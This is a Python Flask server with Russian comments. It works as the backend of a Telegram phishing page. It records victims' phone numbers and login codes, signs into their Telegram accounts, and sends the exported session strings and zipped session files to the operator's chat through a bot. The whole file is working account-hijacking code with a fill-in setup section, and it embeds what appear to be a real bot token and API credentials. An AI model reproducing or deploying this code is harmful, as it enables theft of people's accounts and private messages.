from flask import Flask, request, jsonify, send_from_directory
import os
import asyncio
import re
import requests
from threading import Thread

app = Flask(__name__)

# ===== ЗАМЕНИ ЭТИ 4 СТРОЧКИ =====
BOT_TOKEN = "7972485896:AAGDUO9cKu4qMdoa7dC87-Ybq1kUoPZNF_A"      # тот же, что в bot.py
OWNER_ID = 742347183                # твой ID
API_ID = 39945573                      # с my.telegram.org
API_HASH = "4addef563b163d9d1977fdfb4abf50db"

# ===== ПРОКСИ (ЕСЛИ НУЖЕН) =====
PROXY_ENABLED = False
PROXY_HOST = "bproxy.site"
PROXY_PORT = 1080
PROXY_USERNAME = ""
PROXY_PASSWORD = ""

proxy_dict = None
if PROXY_ENABLED:
    proxy_dict = {"scheme": "socks5", "hostname": PROXY_HOST, "port": PROXY_PORT,
                  "username": PROXY_USERNAME, "password": PROXY_PASSWORD}

def send_telegram(text):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": OWNER_ID, "text": text[:4000]})
    except: pass

def send_file(file_path, caption):
    try:
        with open(file_path, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                          data={"chat_id": OWNER_ID, "caption": caption},
                          files={"document": f})
    except: pass

def login_and_send(phone, code):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(do_login(phone, code))

async def do_login(phone, code):
    from pyrogram import Client
    import zipfile
    try:
        phone = re.sub(r'\D', '', phone)
        if not phone.startswith('7'): phone = '7' + phone
        if phone.startswith('8'): phone = '7' + phone[1:]
        phone = '+' + phone
        send_telegram(f"🔄 Вход в {phone}")
        session_name = f"sessions/{phone.replace('+', '')}"
        os.makedirs("sessions", exist_ok=True)
        client = Client(session_name, api_id=API_ID, api_hash=API_HASH, proxy=proxy_dict)
        await client.connect()
        try:
            await client.sign_in(phone, code)
        except:
            await client.send_code(phone)
            await asyncio.sleep(2)
            await client.sign_in(phone, code)
        session_str = await client.export_session_string()
        session_file = f"{session_name}.session"
        zip_name = f"sessions/{phone.replace('+', '')}.zip"
        with zipfile.ZipFile(zip_name, 'w') as zf:
            zf.write(session_file, arcname=os.path.basename(session_file))
        send_file(zip_name, f"✅ Аккаунт: {phone}\n{session_str}")
        await client.disconnect()
        os.remove(session_file)
        os.remove(zip_name)
    except Exception as e:
        send_telegram(f"❌ Ошибка: {str(e)[:200]}")

@app.route('/')
def index():
    if os.path.exists('index.html'):
        return send_from_directory('.', 'index.html')
    return "OK", 200

@app.route('/api/send_code', methods=['POST'])
def send_code():
    phone = request.json.get('phone', '')
    send_telegram(f"📱 Номер: {phone}")
    return jsonify({"status": "ok"})

@app.route('/api/verify_code', methods=['POST'])
def verify_code():
    phone = request.json.get('phone', '')
    code = request.json.get('code', '')
    send_telegram(f"🔓 Код для {phone}: {code}")
    Thread(target=login_and_send, args=(phone, code)).start()
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
